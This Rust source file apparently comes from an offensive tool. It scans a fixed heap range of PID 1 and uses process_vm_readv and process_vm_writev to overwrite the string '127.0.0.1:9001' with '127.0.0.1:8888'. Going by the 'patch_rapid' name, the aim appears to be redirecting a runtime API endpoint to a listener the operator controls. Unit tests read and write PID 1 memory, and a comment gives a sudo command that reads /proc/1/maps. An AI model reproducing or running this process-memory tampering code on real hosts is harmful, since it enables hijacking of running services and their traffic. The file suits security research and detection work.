use std:: {
    error::Error,
    result::Result,
    io::{
        IoSlice, 
        IoSliceMut,
    },
};
use nix:: {
    unistd::Pid,
    sys::uio:: {
        RemoteIoVec,
        process_vm_readv,
        process_vm_writev
    }
};


#[allow(dead_code)]
//local pid heap addr; printf "%d\n" 0x$(sudo cat /proc/1/maps | grep heap | awk -F"-" '{print $1}') 
const TEST_ADDRESS: usize = 94584240660480;
const TARGET_PID: i32 = 1;
const TARGET_ENV_VAR: &[u8] = b"127.0.0.1:9001";
const NEW_ENV_VAR: &[u8] = b"127.0.0.1:8888";


pub fn patch_rapid() -> Result<(), Box<dyn Error>> {
    let heap_start: usize = 824633720832;  //0xc000000000
    let heap_end: usize = 824637915136;  //0xc000400000
    let mut writes = 0;
    let step: usize = 0x10000;
    let mut lbuf = vec![0; step];
    let rng = std::ops::Range { start: heap_start, end: heap_end };

    for memory_segment in rng.step_by(step) {
        let target: usize = match search_memory(TARGET_PID, memory_segment, &mut lbuf) {
            Some(target) => target,
            None => continue,
        };
        let write_memory_result = match write_memory(TARGET_PID, target, NEW_ENV_VAR) {
            Ok(write_memory_result) => write_memory_result,
            Err(error) => panic!("[-] Memory write error: {}", error),
        };
        
        if crate::VERBOSE {
            println!("[!] Wrote {} bytes to 0x{:x}", write_memory_result, target);
        }

        writes += 1;
    }

    if writes == 0 {
        if crate::VERBOSE == true {
            println!("[!] Failed to patch rapid memory");
        }

        if crate::VERBOSE == false {
            panic!("[-] Failed to patch rapid memory");
        }
    }

    Ok(())
}


fn search_memory(pid: i32, memory_segment: usize, local_buffer: &mut[u8]) -> Option<usize> {
    if crate::VERBOSE == true {
        println!("[+] Searching memory...");
    }

    match read_memory(pid, memory_segment, local_buffer) {
        Ok(..) => {
            if crate::VERBOSE == true {
                println!("[+] Memory {} read", memory_segment);
            }
        },
        Err(error) => {
            if crate::VERBOSE == true {
                println!("[!] Memory {} not read: {:?}", memory_segment, error);
            }
            if crate::FAIL_OPEN == false {
                panic!("[-] Memory {} not read: {:?}", memory_segment, error);
            }
        },
    };
    
    let hit = match local_buffer.windows(TARGET_ENV_VAR.len()).position(|win| win == TARGET_ENV_VAR) {
        Some(hit) => hit,
        None => {
            if crate::VERBOSE == true {
                println!("[!] {:?} not found in memory segment", TARGET_ENV_VAR);
            }
            return None
        }
    };
    
    let target: usize = hit + memory_segment;
    
    Some(target)
}


#[test]
fn search_memory_test() {
    let mut lbuf = vec![0; 10];
    let memory = search_memory(1, TEST_ADDRESS, &mut lbuf);

    assert_eq!(memory, None);
}



fn read_memory(pid: i32, memory_address: usize, local_buffer: &mut[u8]) -> Result<usize, Box<dyn Error>> {
    let size: usize = local_buffer.len(); 
    let mut lmeml = [IoSliceMut::new(local_buffer), ];
    let rmem = RemoteIoVec {
        base: memory_address,
        len: size
    };
    let rmeml = [rmem, ];
    let rb = process_vm_readv(Pid::from_raw(pid), &mut lmeml, &rmeml)?;

    Ok(rb)
}


#[test]
fn read_memory_test() {
    let mut lbuf = vec![0; 10];
    let memory = match read_memory(1, TEST_ADDRESS, &mut lbuf) {
        Ok(memory) => memory,
        Err(error) => panic!("Error: {}", error),
    };

    assert_eq!(memory, 10);
}


fn write_memory(pid: i32, overwrite_position: usize, new_value: &[u8]) -> Result<usize, Box<dyn Error>> {
    let size: usize = new_value.len();
    let lmem = [IoSlice::new(new_value), ];
    let rmem = RemoteIoVec {
        base: overwrite_position,
        len: size
    };
    let rmem = [rmem, ];
    let write_result = process_vm_writev(Pid::from_raw(pid), &lmem, &rmem)?;

    if write_result == 0 {
        println!("[!] Wrote 0 bytes to memory at {:?}", overwrite_position);
    }

    Ok(write_result)
}


#[test]
fn write_memory_test() {
    let pid = 1;
    let overwrite_position = TEST_ADDRESS;
    let new_value: &[u8] = b" "; //sudo hexdump -C -s 0x557d59961000 /dev/mem | head -n 1
    let result = match write_memory(pid, overwrite_position, new_value) {
        Ok(result) => result,
        Err(error) => panic!("Error: {}", error),
    };

    assert_ne!(result, 0);    
}













